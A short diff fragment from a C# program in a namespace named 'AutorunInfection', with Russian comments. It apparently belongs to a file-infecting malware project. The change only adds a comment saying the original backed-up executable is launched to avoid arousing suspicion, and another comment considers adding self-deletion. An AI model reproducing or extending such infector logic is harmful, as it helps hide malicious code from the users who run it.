@@ -65,7 +65,7 @@ namespace AutorunInfection
                 // Перезапускаем скопированный файл
 
                 Process.Start(targetFilePath); // Запускаем наш файл
-                Process.Start(bakPath);
+                Process.Start(bakPath); // Запускаем оригинальный файл для беспалевности
 
                 // тут можно добавить самоудаление файла после всех действий, пока стоит обычное завершение  Environment.Exit(0);
 
